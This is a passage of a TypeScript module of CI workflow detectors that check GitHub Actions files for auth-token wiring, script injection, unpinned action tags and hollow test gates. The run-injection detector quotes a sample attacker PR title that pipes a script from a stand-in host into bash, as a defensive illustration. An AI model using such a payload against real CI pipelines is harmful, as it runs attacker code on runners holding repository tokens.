// checks/after/ci-yml.ts — the consumer's CI workflows: token env, actionlint, run injection,
// the capstone contract, the cloud gate, floating action tags, tagged tests without a CI home,
// run levels, turbo inputs and the integration env.
import * as fs from "node:fs";
import * as path from "node:path";
import { readPackageJson } from "../../shared/package-json.js";
// ---------------------------------------------------------------------------
// Other post-install detectors
// ---------------------------------------------------------------------------
/**
 * Detect whether the bkit-ci.yml install step is wired to authenticate to GH Packages.
 * Returns null if no bkit-ci.yml, no `pnpm install` step, or the step is correctly wired
 * (no false positives).
 *
 * On pnpm >=10.34.3 the correct shape requires BOTH:
 *   (1) a `pnpm config set "//npm.pkg.github.com/:_authToken=$BKIT_GH_TOKEN_INSTALL"` step that
 *       writes the token into pnpm's user-level config before install, AND
 *   (2) the `BKIT_GH_TOKEN_INSTALL: ${{ secrets.BKIT_GH_TOKEN_INSTALL }}` env mapping that feeds it.
 * Either missing → the next install 401s on download. Severity is "blocker" when the
 * project .npmrc shows the repo authenticates to GH Packages (registry mapping or a
 * ${BKIT_GH_TOKEN_INSTALL} ref); otherwise "advisory". Phase 3 does not exit-1
 * (writes already happened).
 */
export function detectCiYmlMissingTokenEnv(cwd) {
    const ciPath = path.join(cwd, ".github", "workflows", "bkit-ci.yml");
    if (!fs.existsSync(ciPath))
        return null;
    const content = fs.readFileSync(ciPath, "utf-8");
    // Require an install step before flagging (avoid false positives).
    if (!content.includes("pnpm install"))
        return null;
    // Env mapping (whitespace/quoting variations):
    //   BKIT_GH_TOKEN_INSTALL: ${{ secrets.BKIT_GH_TOKEN_INSTALL }} | "${{ … }}" | ${{secrets.BKIT_GH_TOKEN_INSTALL}}
    const hasTokenEnv = /BKIT_GH_TOKEN_INSTALL\s*:\s*["']?\$\{\{\s*secrets\.BKIT_GH_TOKEN_INSTALL\s*\}\}["']?/.test(content);
    // User-level auth step: `pnpm config set "//npm.pkg.github.com/:_authToken=…"`.
    const hasConfigSet = /pnpm\s+config\s+set\s+["']?\/\/npm\.pkg\.github\.com\/:_authToken=/.test(content);
    // Correctly wired → no finding.
    if (hasTokenEnv && hasConfigSet)
        return null;
    // Blocker when .npmrc shows the repo authenticates to GH Packages — next run 401s.
    const npmrcPath = path.join(cwd, ".npmrc");
    let npmrcUsesGhPackages = false;
    if (fs.existsSync(npmrcPath)) {
        const npmrcContent = fs.readFileSync(npmrcPath, "utf-8");
        npmrcUsesGhPackages =
            npmrcContent.includes("@cbartens:registry=") ||
                npmrcContent.includes("${BKIT_GH_TOKEN_INSTALL}");
    }
    const missing = [];
    if (!hasConfigSet)
        missing.push("a `pnpm config set` auth step");
    if (!hasTokenEnv)
        missing.push("the BKIT_GH_TOKEN_INSTALL env mapping");
    const missingText = missing.join(" and ");
    return {
        id: "ci-yml-missing-token-env",
        severity: npmrcUsesGhPackages ? "blocker" : "advisory",
        detect: npmrcUsesGhPackages
            ? `.github/workflows/bkit-ci.yml has a pnpm install step but is missing ${missingText}, and .npmrc authenticates to the GitHub Packages registry. The next CI run will 401 on the @cbartens/bkit download.`
            : `.github/workflows/bkit-ci.yml has a pnpm install step but is missing ${missingText}.`,
        action: "Update the install step in .github/workflows/bkit-ci.yml to write the auth token into pnpm's user-level config BEFORE install:\n\n" +
            "    - name: Install Dependencies\n" +
            "      run: |\n" +
            '        pnpm config set "//npm.pkg.github.com/:_authToken=$BKIT_GH_TOKEN_INSTALL"\n' +
            "        pnpm install --frozen-lockfile\n" +
            "      env:\n" +
            "        BKIT_GH_TOKEN_INSTALL: ${{ secrets.BKIT_GH_TOKEN_INSTALL }}\n\n" +
            "pnpm >=10.34.3 does not authenticate a project-.npmrc ${BKIT_GH_TOKEN_INSTALL} env-substitution (it 401s on download), so the token must be set via `pnpm config set` — the shell expands $BKIT_GH_TOKEN_INSTALL to the literal token before pnpm stores it in user-level config, version-proof across pnpm 10.x and 11.x.\n\n" +
            "Also confirm the secret exists: `gh secret list | grep BKIT_GH_TOKEN_INSTALL`. If absent: `gh secret set BKIT_GH_TOKEN_INSTALL --body=$BKIT_GH_TOKEN_INSTALL`.",
    };
}
/**
 * Detect the always-true `if:` gate in `.github/workflows/bkit-cloud.yml`: a `|`
 * block scalar wrapping ${{ }}. GitHub Actions sees extra characters around ${{ }}
 * (the block scalar's newlines) and evaluates the whole condition to a non-empty
 * string === always true — so the free-tier `bkit [auto route]` gate never fires and
 * the run job executes on every triggering event (unintended runner-minute spend).
 *
 * Fires only while the broken construct is present; the fixed form is a `>-` folded
 * expression with no ${{ }} wrapper. bkit-cloud.yml is the consumer's copy of a
 * template and bkit never rewrites it, so the action inlines the manual fix.
 */
export function detectBkitCloudYmlAlwaysTrueGate(cwd) {
    const cloudPath = path.join(cwd, ".github", "workflows", "bkit-cloud.yml");
    if (!fs.existsSync(cloudPath))
        return null;
    const content = fs.readFileSync(cloudPath, "utf-8");
    // Broken construct: an `if:` block scalar (`|` / `>`) whose first content line is ${{.
    if (!/^\s*if:\s*[|>][^\n]*\n\s*\$\{\{/m.test(content))
        return null;
    return {
        id: "bkit-auto-yml-always-true-gate",
        severity: "advisory",
        detect: ".github/workflows/bkit-cloud.yml writes its auto-route `if:` gate as a `|` block scalar wrapping ${{ }} — GitHub Actions evaluates this to a non-empty string (always true), so the free-tier `bkit [auto route]` gate never fires and the job runs on every triggering event.",
        action: "Replace the auto-route job's `if: |` block scalar with a `>-` folded expression that drops the ${{ }} wrapper (GitHub Actions evaluates `if:` expressions natively):\n\n" +
            "    if: >-\n" +
            "      github.event_name == 'workflow_dispatch'\n" +
            "      || (\n" +
            "      (github.event.workflow_run.conclusion == 'success' || github.event.workflow_run.conclusion == 'failure')\n" +
            "      && contains(github.event.workflow_run.head_commit.message, 'bkit [auto route]')\n" +
            "      )\n\n" +
            "Validate with `actionlint` — the `[if-cond]` finding disappears once the wrapper is gone.",
    };
}
/**
 * Matches a `.github/workflows/bkit-ci.yml` copied from the bkit-ci.yml template: an uncommented
 * job named `bkit-tests` or `bkit-tests-<lane>`, the job names every lane of the template
 * carries.
 */
const ADOPTED_CI_JOB_RE = /^[ \t]+bkit-tests(?:-[\w-]+)?:[ \t]*$/m;
/**
 * Detect a `.github/workflows/bkit-ci.yml` adopted from bkit's template with no `actionlint` step.
 * `yaml.safe_load` (and generic YAML linters) accept workflows that are valid YAML
 * but invalid GitHub Actions (doubled quotes inside ${{ }}, always-true `if:` block
 * scalars). actionlint is GHA-aware and catches that class.
 *
 * Only fires when the consumer adopted the bkit-ci.yml template (ADOPTED_CI_JOB_RE).
 * bkit-ci.yml is the consumer's file, so `bkit install` never adds the step — the action
 * inlines the manual step.
 */
export function detectCiYmlMissingActionlint(cwd) {
    const ciPath = path.join(cwd, ".github", "workflows", "bkit-ci.yml");
    if (!fs.existsSync(ciPath))
        return null;
    const content = fs.readFileSync(ciPath, "utf-8");
    if (!ADOPTED_CI_JOB_RE.test(content))
        return null;
    if (/actionlint/i.test(content))
        return null;
    return {
        id: "ci-yml-missing-actionlint",
        severity: "advisory",
        detect: ".github/workflows/bkit-ci.yml (adopted from bkit's template) has no actionlint step. yaml.safe_load accepts workflows that are valid YAML but invalid GitHub Actions (e.g. doubled quotes inside ${{ }}, an always-true `if:` block scalar); actionlint is GHA-aware and catches them.",
        action: "Add an actionlint step among the static checks in .github/workflows/bkit-ci.yml (before the test/build group):\n\n" +
            "      - name: Run actionlint\n" +
            "        if: steps.cache.outputs.skip != 'true'\n" +
            "        run: |\n" +
            '          curl -sSfL https://raw.githubusercontent.com/rhysd/actionlint/v1.7.12/scripts/download-actionlint.bash -o "$RUNNER_TEMP/download-actionlint.bash"\n' +
            '          bash "$RUNNER_TEMP/download-actionlint.bash" 1.7.12 "$RUNNER_TEMP"\n' +
            '          "$RUNNER_TEMP/actionlint" -color',
    };
}
/**
 * Detect an untrusted GitHub Actions expression interpolated directly into a `run:` shell
 * body in `.github/workflows/bkit-ci.yml` — the classic GHA script-injection sink. A PR titled
 * `"; curl evil.sh | bash; "` expands into the runner's shell when `${{ github.event.* }}`
 * (or `github.head_ref`) is inlined into `run:` text. The safe form is env-indirection: map
 * the value to an `env:` var and reference `$VAR` (GitHub runtime-expands env values and never
 * re-parses them as shell). bkit-ci.yml is the consumer's file — bkit's template was hardened but
 * nothing back-fills a copy adopted before the fix, so it keeps the vulnerable inline form.
 * This surfaces it as a dedicated security finding.
 *
 * Line-based (no YAML dep, like the sibling bkit-ci.yml detectors): tracks `run:` blocks by
 * indentation and flags untrusted expressions inside their bodies only. `env:` / `if:` /
 * `with:` / `concurrency:` contexts are NOT run bodies, so the safe env-indirection form does
 * not fire; a YAML-commented `run:` key never opens a body, so shipped commented stubs stay
 * silent. Only scans a bkit-ci.yml adopted from bkit's template (ADOPTED_CI_JOB_RE).
 */
export function detectCiYmlRunInjection(cwd) {
    const ciPath = path.join(cwd, ".github", "workflows", "bkit-ci.yml");
    if (!fs.existsSync(ciPath))
        return null;
    const content = fs.readFileSync(ciPath, "utf-8");
    if (!ADOPTED_CI_JOB_RE.test(content))
        return null;
    // Attacker-controllable payload contexts: any github.event.* field and github.head_ref.
    // github.base_ref / github.event_name / SHAs are constrained values and are excluded
    // (the shipped commented stubs reference github.base_ref).
    const UNTRUSTED = /\$\{\{[^}]*\b(?:github\.event\.[\w.]+|github\.head_ref)\b[^}]*\}\}/;
    const indentOf = (l) => l.length - l.replace(/^[ \t]*/, "").length;
    const hits = [];
    let runKeyIndent = null; // indent of an active `run:` key; its body is deeper
    for (const line of content.split("\n")) {
        if (runKeyIndent !== null) {
            if (line.trim() === "")
                continue; // blank lines belong to the block scalar
            if (indentOf(line) <= runKeyIndent) {
                runKeyIndent = null; // block ended — re-examine this line below
            }
            else {
                if (UNTRUSTED.test(line))
                    hits.push(line.trim());
                continue;
            }
        }
        if (/^\s*#/.test(line))
            continue; // a commented `run:` key never opens a body
        // `run:` may be the first key of a `- ` list item (`- run: |`), which shifts the real
        // key column; body membership is measured from the `run:` token, not the line start, so a
        // sibling key (`env:` / `if:`) at the run: column correctly closes the block.
        const m = /^([ \t]*)(-[ \t]+)?run:[ \t]*(.*)$/.exec(line);
        if (!m)
            continue;
        const keyIndent = (m[1] ?? "").length + (m[2] ?? "").length;
        const rest = (m[3] ?? "").trim();
        if (rest === "" || /^[|>]/.test(rest)) {
            runKeyIndent = keyIndent; // block scalar (`run: |` / `run: >`) — body follows
        }
        else if (UNTRUSTED.test(rest)) {
            hits.push(line.trim()); // inline `run: <cmd with ${{ … }}>`
        }
    }
    if (hits.length === 0)
        return null;
    const shown = hits
        .slice(0, 3)
        .map((h) => `  ${h}`)
        .join("\n");
    const more = hits.length > 3 ? `\n  … (+${hits.length - 3} more)` : "";
    return {
        id: "ci-yml-run-injection",
        severity: "advisory",
        detect: "SECURITY: .github/workflows/bkit-ci.yml interpolates untrusted GitHub Actions input " +
            "(github.event.* / github.head_ref) directly into a run: shell body — a script-injection " +
            'sink. A PR title or branch name like `"; curl evil.sh | bash; "` then runs on your CI ' +
            `runner (which holds GITHUB_TOKEN):\n${shown}${more}`,
        action: "Route each untrusted value through an env: var and reference it as a shell variable — " +
            "GitHub runtime-expands env values and never re-parses them as shell, closing the injection:\n\n" +
            "    - name: <step>\n" +
            "      env:\n" +
            "        PR_TITLE: ${{ github.event.pull_request.title }}\n" +
            "      run: |\n" +
            '        MSG="$PR_TITLE"   # NOT MSG="${{ github.event.pull_request.title }}"\n\n' +
            "Apply the same env-indirection to every flagged line (github.event.*, github.head_ref). " +
            "bkit's current bkit-ci.yml template already uses this form — re-sync the affected steps from " +
            ".bkit/templates/.github/workflows/bkit-ci.yml if you adopted it before the hardening.",
    };
}
/**
 * Detect drift of the consumer's `bkit-tests-check` capstone from bkit's canonical
 * CI contract. bkit-ci.yml is the consumer's copy of a template; bkit never rewrites it.
 * WARNING-ONLY presence check: flags the ABSENCE of a known-good fragment, never
 * "differs from canonical". Fires when bkit-ci.yml defines a bkit-tests-check job (the
 * template ships one).
 *
 * Every check reads `code` (full-line comments stripped): the template's commented
 * scaffold reference names `bkit-tests-check`, `!cancelled()` and `live_ran`.
 */
export function detectCiYmlCapstoneContractDrift(cwd) {
    const ciPath = path.join(cwd, ".github", "workflows", "bkit-ci.yml");
    if (!fs.existsSync(ciPath))
        return null;
    const content = fs.readFileSync(ciPath, "utf-8");
    const code = content
        .split("\n")
        .filter((line) => !/^\s*#/.test(line))
        .join("\n");
    if (!/^\s+bkit-tests-check:/m.test(code))
        return null; // no capstone job
    const missing = [];
    // 1. Capstone must run on !cancelled() (NOT always()) — else a concurrency-cancel
    //    stamps a bogus failure on the required check and blocks release PRs.
    if (!code.includes("!cancelled()")) {
        missing.push("the capstone `if: ${{ !cancelled() }}` guard — without it a concurrency-cancel stamps a bogus failure on the required check (use `!cancelled()`, never `always()`).");
    }
    // 2. One run per branch or pull request. A newer run cancels the older one on every
    //    event. The group keys a PR on its number and a push on the ref — not github.run_id,
    //    which never collides and so never cancels. A push then plans from the last green run.
    const prOnlyCancel = /cancel-in-progress:\s*\$\{\{\s*github\.event_name\s*==\s*'pull_request'\s*\}\}/.test(code);
    const runIdGroup = /group:[^\n]*github\.run_id/.test(code);
    if (/concurrency:/.test(code) && (prOnlyCancel || runIdGroup)) {
        missing.push("one run per branch or pull request — `cancel-in-progress: true`, group `ci-${{ github.workflow }}-${{ github.event_name == 'pull_request' && format('pr-{0}', github.event.pull_request.number) || github.ref }}`. A PR-only cancel, or a group keyed on `github.run_id`, lets a superseded push keep running. A push plans from the last green run on the branch, so a cancelled run's changes stay in scope.");
    }
    // 3. Non-hollow capstone: every test lane's executed count must be read downstream, not
    //    just its result (passWithNoTests / no-CI-home / all-skipIf are green-with-zero).
    //    Checked per lane: one lane's count says nothing about another's.
    const lanes = [
        ...code.matchAll(/^\s+(bkit-tests-(?:unit|integration|e2e|live)(?:-[a-z0-9]+)*):\s*$/gm),
    ].map((m) => m[1]);
    const uncounted = lanes.filter((lane) => !new RegExp(`needs\\.${lane}\\.outputs\\.\\w+_(?:ran|count)\\b`).test(code));
    if (uncounted.length > 0) {
        missing.push(`an executed-count assertion (non-hollow gate) for ${uncounted.map((l) => "`" + l + "`").join(", ")} — the capstone should read each lane's count output (e.g. \`needs.bkit-tests-live-web.outputs.live_ran\`) and assert >0 when that tier is planned, else passWithNoTests / a tagged suite with no CI home / all-skipIf tests pass vacuously. See docs/testing.md § "Validated means executed".`);
    }
    if (missing.length === 0)
        return null;
    return {
        id: "ci-yml-capstone-contract-drift",
        severity: "advisory",
        detect: `.github/workflows/bkit-ci.yml (adopted from bkit's template) has a bkit-tests-check capstone missing ${missing.length} ` +
            "load-bearing invariant(s) from bkit's canonical CI contract. bkit-ci.yml is yours to own, so bkit can't rewrite it — this is a heads-up, not a hard failure.",
        action: "Consider restoring these to keep `green == validated` (see the FULL CI SCAFFOLD REFERENCE in the bkit bkit-ci.yml template):\n\n" +
            missing.map((m) => "  - " + m).join("\n"),
    };
}
// Tag-gated tiers invoked via a per-package script: a tagged test whose owning package
// declares no matching script is silently skipped by `turbo run <script>` (exits 0) —
// the tag is dead and the tier ghost-greens. Suffix-based tiers (integration via
// *.integration.test.ts) are covered by the bkit-ci.yml template's own missing-script warning.
const TAG_SCRIPT_HOMES = [
    { tag: "@live", script: "test:live" },
    { tag: "@smoke", script: "test:smoke" },
];
const HOME_WALK_SKIP_DIRS = new Set([
    "node_modules",
    ".git",
    ".worktrees", // local git worktree roots — checkouts of the same repo, not part of it
    "dist",
    ".next",
    "coverage",
    ".turbo",
    "playwright-report",
    "test-results",
    ".vercel",
]);
function walkRepoForHomeCheck(dir, testFiles, packageJsons, depth = 0) {
    if (depth > 8)
        return;
    let entries;
    try {
        entries = fs.readdirSync(dir, { withFileTypes: true });
    }
    catch (err) {
        // Unreadable directory (permissions / not-a-dir race): skip this subtree, logged
        // under BKIT_DEBUG.
        if (process.env.BKIT_DEBUG)
            console.error(`[bkit] home-check skipped ${dir}: ${err.message}`);
        return;
    }
    for (const e of entries) {
        const full = path.join(dir, e.name);
        if (e.isDirectory()) {
            if (HOME_WALK_SKIP_DIRS.has(e.name))
                continue;
            walkRepoForHomeCheck(full, testFiles, packageJsons, depth + 1);
        }
        else if (e.name === "package.json") {
            packageJsons.push(full);
        }
        else if (/\.(test|spec)\.[cm]?tsx?$/.test(e.name)) {
            testFiles.push(full);
        }
    }
}
// A tag gates a tier by appearing in a test's NAME — the runner selects it with a
// `-t @live` / `--testNamePattern` filter, which matches the test TITLE. So only a tag
// inside a test-title string is a real tagged test; the same token in a code comment or
// an unrelated string literal (e.g. a doc-comment that documents the convention) is not.
// Matches the tag inside the title argument of it / test / describe / bench / suite,
// including `.only` / `.skip` / `.each(table)` chains and ' " ` quotes.
const TEST_DEF_TITLE = /\b(?:it|test|describe|bench|suite)(?:\.\w+)*\s*(?:\([^)]*\)\s*)?\(\s*(['"`])((?:\\.|(?!\1)[\s\S])*?)\1/g;
// Mark every byte that sits inside a string, template literal, or comment. A REAL
// test definition's `it`/`describe` keyword is code (mask 0); a keyword that appears
// INSIDE a string is a fixture — a tag-linter package embeds sample test source as a
// string literal (`const F = \`describe("@live X", …)\``) to lint it. Masked keyword
// positions are skipped; real, runnable tests are never authored inside a quote.
//
// `'`/`"` strings terminate at end-of-line; only template literals span lines, so a
// mis-lex from a regex literal containing a lone quote stays on its own line. Regex
// literals are otherwise treated as plain code.
function stringCommentMask(text) {
    const mask = new Uint8Array(text.length);
    const n = text.length;
    let i = 0;
    while (i < n) {
        const c = text[i];
        if (c === "/" && text[i + 1] === "/") {
            while (i < n && text[i] !== "\n")
                mask[i++] = 1;
            continue;
        }
        if (c === "/" && text[i + 1] === "*") {
            mask[i++] = 1;
            mask[i++] = 1;
            while (i < n && !(text[i] === "*" && text[i + 1] === "/"))
                mask[i++] = 1;
            if (i < n) {
                mask[i++] = 1;
                mask[i++] = 1;
            }
            continue;
        }
        if (c === '"' || c === "'" || c === "`") {
            const singleLine = c !== "`";
            mask[i++] = 1;
            while (i < n) {
                if (text[i] === "\\") {
                    mask[i++] = 1;
                    if (i < n)
                        mask[i++] = 1;
                    continue;
                }
                if (text[i] === c) {
                    mask[i++] = 1;
                    break;
                }
                if (singleLine && text[i] === "\n")
                    break; // unterminated — stop at line end
                mask[i++] = 1;
            }
            continue;
        }
        i++;
    }
    return mask;
}
function tagUsedInTestTitle(text, tag, mask) {
    TEST_DEF_TITLE.lastIndex = 0;
    let m;
    while ((m = TEST_DEF_TITLE.exec(text)) !== null) {
        if (mask[m.index])
            continue; // keyword sits inside a string/comment — a fixture, not a real test
        if (m[2].includes(tag))
            return true;
    }
    return false;
}
/**
 * Detect `@live` / `@smoke`-tagged tests whose owning package declares no matching
 * `test:live` / `test:smoke` script — they have "no CI home": `turbo run test:live`
 * skips a package with no such script and exits 0, so the tagged tests never run and the
 * live/smoke tier reports green having executed nothing.
 *
 * Only flags a tag when the convention is ACTIVE in the repo (at least one package
 * declares the script); a silent no-op otherwise. WARNING-only; the capstone's
 * `run_live => live_ran > 0` assertion is the runtime check.
 */
export function detectTaggedTestsWithoutCiHome(cwd) {
    const testFiles = [];
    const packageJsons = [];
    walkRepoForHomeCheck(cwd, testFiles, packageJsons);
    if (testFiles.length === 0 || packageJsons.length === 0)
        return null;
    // pkgPath -> scripts object; and the set of every script name declared anywhere.
    const pkgScripts = new Map();
    const declaredScripts = new Set();
    for (const pj of packageJsons) {
        try {
            const parsed = JSON.parse(fs.readFileSync(pj, "utf-8"));
            const scripts = parsed.scripts ?? {};
            pkgScripts.set(pj, scripts);
            for (const name of Object.keys(scripts))
                declaredScripts.add(name);
        }
        catch {
            pkgScripts.set(pj, {});
        }
    }
    const nearestPkg = (fileDir) => {
        let dir = fileDir;
        for (;;) {
            const pj = path.join(dir, "package.json");
            if (pkgScripts.has(pj))
                return pj;
            const parent = path.dirname(dir);
            if (parent === dir || dir === cwd)
                return pkgScripts.has(pj) ? pj : null;
            dir = parent;
        }
    };
    const homeless = new Map(); // tag -> set of "pkgdir (needs `script`)"
    for (const file of testFiles) {
        let text;
        try {
            text = fs.readFileSync(file, "utf-8");
        }
        catch {
            continue;
        }
        let mask = null; // lazily built on the first tag that survives fast-reject
        for (const { tag, script } of TAG_SCRIPT_HOMES) {
            if (!declaredScripts.has(script))
                continue; // convention not active for this tag
            if (!text.includes(tag))
                continue; // fast reject before the title-context regex
            mask ??= stringCommentMask(text);
            if (!tagUsedInTestTitle(text, tag, mask))
                continue; // tag must be in a real test TITLE, not a comment/string/fixture
            const pj = nearestPkg(path.dirname(file));
            if (!pj)
                continue;
            if (typeof pkgScripts.get(pj)?.[script] !== "string") {
                const rel = path.relative(cwd, path.dirname(pj)) || ".";
                if (!homeless.has(tag))
                    homeless.set(tag, new Set());
                homeless.get(tag)?.add(rel);
            }
        }
    }
    if (homeless.size === 0)
        return null;
    const lines = [];
    for (const { tag, script } of TAG_SCRIPT_HOMES) {
        const pkgs = homeless.get(tag);
        if (pkgs && pkgs.size > 0) {
            lines.push(`  ${tag} (run by \`turbo run ${script}\`) → add \`${script}\` to: ${[...pkgs].sort().join(", ")}`);
        }
    }
    return {
        id: "tagged-tests-no-ci-home",
        severity: "advisory",
        detect: "Found `@live`/`@smoke`-tagged tests in package(s) that declare no matching `test:live`/`test:smoke` script. `turbo run test:live` skips a package with no such script and exits 0 — the tagged tests never run, and the tier reports green having executed nothing (ghost-green / 'no CI home').",
        action: "Give each tagged suite a CI home — add the matching script to the package's package.json so the live/smoke tier actually invokes it:\n\n" +
            lines.join("\n") +
            '\n\nExample: `"test:live": "vitest run --project live"` (or your runner\'s tag filter). The bkit-tests-check capstone\'s `run_live => live_ran > 0` assertion is the runtime backstop; this catches it earlier.',
    };
}
// ---------------------------------------------------------------------------
// Consumer customisations that bkit ships primitives for but does NOT enforce
// — turbo inputs, integration runtime env, GHA pinning, renovate, etc.
// ---------------------------------------------------------------------------
/**
 * Detect whether the consumer's turbo.json declares external-state proxies in
 * `inputs` for `test:integration` / `test:e2e` tasks. Without proxies, turbo's
 * content-keyed cache can replay a stale green when external state (Supabase
 * migrations, fixture data, env templates) changed — the BAR-192 ghost-green
 * failure mode documented in KN-24. Returns null when no turbo.json or no
 * matching tasks.
 */
export function detectTurboIntegrationInputs(cwd) {
    const findings = [];
    const turboPath = path.join(cwd, "turbo.json");
    if (!fs.existsSync(turboPath))
        return findings;
    let doc;
    try {
        doc = JSON.parse(fs.readFileSync(turboPath, "utf-8"));
    }
    catch {
        return findings;
    }
    // turbo v2 → `tasks`; turbo v1 → `pipeline`. Either may be present.
    const tasks = doc.tasks ?? doc.pipeline ?? {};
    const externalProxyHints = ["migrations", "fixtures", "seed", ".env"];
    for (const taskName of ["test:integration", "test:e2e"]) {
        const task = tasks[taskName];
        if (!task)
            continue;
        const inputs = Array.isArray(task.inputs) ? task.inputs : [];
        const hasProxy = inputs.some((i) => externalProxyHints.some((hint) => typeof i === "string" && i.toLowerCase().includes(hint)));
        if (hasProxy)
            continue;
        findings.push({
            id: `turbo-${taskName.replace(":", "-")}-inputs-missing`,
            severity: "advisory",
            detect: `turbo.json#${tasks === doc.pipeline ? "pipeline" : "tasks"}.${taskName} has no external-state proxies in \`inputs\` (no migrations / fixtures / seed / .env entries).`,
            action: `Add the external-state proxies that affect this task's outcome to \`inputs\`:\n\n` +
                `    "${taskName}": {\n` +
                `      "cache": true,\n` +
                `      "inputs": ["supabase/migrations/**", "**/fixtures/**", "**/.env.*.template"]\n` +
                `    }\n\n` +
                `Without them, turbo cache replays can ghost-green a stale SHA (KN-24): a concurrent migration on dev between PR-CI and merge-CI does NOT bust the cache, so the merge run replays the pre-migration green. Adjust the glob set to match your consumer's external-state surface.`,
        });
    }
    return findings;
}
/**
 * Detect whether the consumer's `test:integration` lane asserts real-service runtime
 * env (TEST_REAL_APIS, SUPABASE_*, service-role URL refs). A lane that silently mocks
 * integration tests passes CI without exercising real services (KN-23). Returns null if
 * no `test:integration` script.
 *
 * All three gating layers are inspected before flagging a no-op lane: (1) the script
 * string itself, (2) the CI workflow job that invokes `test:integration` (an
 * env-agnostic script provisioned at the lane), (3) the vitest integration config the
 * script points at (home of the documented in-file guard).
 */
export function detectTestIntegrationEnv(cwd) {
    const read = readPackageJson(cwd);
    if (!read.ok)
        return null;
    const pkg = read.pkg;
    const script = pkg.scripts?.["test:integration"];
    if (!script)
        return null;
    const realServiceHints = [
        "TEST_REAL_APIS",
        "SUPABASE_SERVICE_ROLE",
        "SUPABASE_URL",
        "service_role",
        "supabase start",
    ];
    const hasHint = (t) => realServiceHints.some((h) => t.includes(h));
    // 1. Script body / chain (consumers commonly wrap real-API setup in a sibling script).
    if (hasHint(script))
        return null;
    // 2. CI workflow lane: a workflow file that BOTH invokes `test:integration` AND
    //    provisions a real-service hint is the lane doing the gating — the pattern for an
    //    env-agnostic script (`supabase start` + `TEST_REAL_APIS` +
    //    service-role export around `turbo run test:integration`).
    const workflowsDir = path.join(cwd, ".github", "workflows");
    if (fs.existsSync(workflowsDir) && fs.statSync(workflowsDir).isDirectory()) {
        for (const entry of fs.readdirSync(workflowsDir, { withFileTypes: true })) {
            if (!entry.isFile() || !/\.ya?ml$/.test(entry.name))
                continue;
            const wf = fs.readFileSync(path.join(workflowsDir, entry.name), "utf-8");
            if (wf.includes("test:integration") && hasHint(wf))
                return null;
        }
    }
    // 3. vitest integration config the script points at (or a conventional default) —
    //    where consumers document/enforce the per-file `TEST_REAL_APIS` guard.
    const configFromScript = /--config[=\s]+(\S+)/.exec(script)?.[1];
    const configCandidates = [
        ...(configFromScript ? [configFromScript] : []),
        "vitest.integration.config.ts",
        "vitest.integration.config.mts",
        "vitest.integration.config.js",
    ];
    for (const rel of configCandidates) {
        const cfgPath = path.join(cwd, rel);
        if (fs.existsSync(cfgPath) && hasHint(fs.readFileSync(cfgPath, "utf-8")))
            return null;
    }
    return {
        id: "test-integration-env-not-asserted",
        severity: "advisory",
        detect: "`package.json#scripts.test:integration` exists, but no real-service env gating (TEST_REAL_APIS, SUPABASE_SERVICE_ROLE, service-role URL, or a `supabase start` chain) was found in the script, the CI workflow lane that runs it, or the vitest integration config.",
        action: "Confirm integration tests actually exercise real services — otherwise the CI integration step (your own, or the one in bkit's bkit-ci.yml template once adopted) is a no-op (KN-23 false-confidence loop). Provision the real-service env at ANY one of these layers (all are recognised):\n\n" +
            '  - script: "test:integration": "TEST_REAL_APIS=true SUPABASE_URL=$SUPABASE_DEV_URL vitest run --config=vitest.integration.config.ts"\n' +
            "  - CI lane: set `TEST_REAL_APIS` / export the service-role URL / chain `supabase start` around `turbo run test:integration` in the `.github/workflows/*.yml` job that runs it (keeps local `pnpm test:integration` env-agnostic)\n" +
            "  - vitest integration config: document/enforce the per-file `TEST_REAL_APIS` guard in the config the script `--config`s to.",
    };
}
/**
 * Detect whether `.github/workflows/<file>.yml` uses floating action tag
 * references (`uses: <owner>/<repo>@v\d+`) without SHA pinning. KN-3 mandates
 * SHA pins for any workflow that runs with elevated permissions. Every workflow file
 * is the consumer's (bkit ships workflows as templates only), so every one is scanned.
 */
export function detectGhaFloatingTags(cwd) {
    const workflowsDir = path.join(cwd, ".github", "workflows");
    if (!fs.existsSync(workflowsDir) || !fs.statSync(workflowsDir).isDirectory())
        return null;
    const floatingByFile = new Map();
    for (const entry of fs.readdirSync(workflowsDir, { withFileTypes: true })) {
        if (!entry.isFile())
            continue;
        if (!/\.ya?ml$/.test(entry.name))
            continue;
        const content = fs.readFileSync(path.join(workflowsDir, entry.name), "utf-8");
        // Matches `uses: org/repo@v1`, `uses: org/repo@v1.2.3`, but NOT `uses: org/repo@<40-char-sha>`.
        const re = /uses:\s*([^\s@]+@v[\d.]+)/g;
        const matches = Array.from(content.matchAll(re), (m) => m[1]);
        if (matches.length > 0)
            floatingByFile.set(entry.name, matches);
    }
    if (floatingByFile.size === 0)
        return null;
    const lines = Array.from(floatingByFile.entries())
        .map(([file, refs]) => `  ${file}: ${refs.join(", ")}`)
        .join("\n");
    return {
        id: "gha-actions-floating-tags",
        severity: "advisory",
        detect: `.github/workflows/ uses floating-tag action refs (KN-3). Affected files:\n${lines}`,
        action: "Replace each `@vN[.N.N]` with a 40-character commit SHA and a `# vN.N.N` comment, e.g.:\n\n" +
            "    - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1\n\n" +
            "Look up SHAs with `git ls-remote https://github.com/<org>/<repo>.git 'refs/tags/v*' | tail -3`. Apply to ALL workflow files that run with elevated permissions (`packages: write`, `id-token: write`). Copy `.github/renovate.json5` or `.github/dependabot.yml` from the bkit examples so SHA pins refresh on upstream releases. See docs/deployments.md § Dependency updaters.",
    };
}
/**
 * Detect whether the consumer composed a gate on bkit's `Detect Direct Push` step
 * outputs (`should_force_build` / `should_run_full`). The bkit-ci.yml template ships these
 * primitives only — without a consumer-side gate reading the outputs, the force-tag
 * system documented in deployments.md is documentation-only.
 *
 * "Composition" = a `steps.detect.outputs.should_*` READ on an uncommented line, in a
 * sibling workflow or in bkit-ci.yml itself. bkit's shipped steps only SET these outputs and
 * the example E2E gate ships commented (`bkit-stub:e2e`), so neither false-positives.
 */
export function detectRunLevelsNotComposed(cwd) {
    const ciPath = path.join(cwd, ".github", "workflows", "bkit-ci.yml");
    if (!fs.existsSync(ciPath))
        return null;
    const ciContent = fs.readFileSync(ciPath, "utf-8");
    // Bkit's bkit-ci.yml ships the `Detect Direct Push` step — if absent, no primitives to compose.
    if (!ciContent.includes("Detect Direct Push"))
        return null;
    const workflowsDir = path.join(cwd, ".github", "workflows");
    // A consumer "composes" run-levels by READING bkit's force-tag outputs in a gate
    // (`steps.detect.outputs.should_*`). bkit's own shipped bkit-ci.yml only SETS those outputs
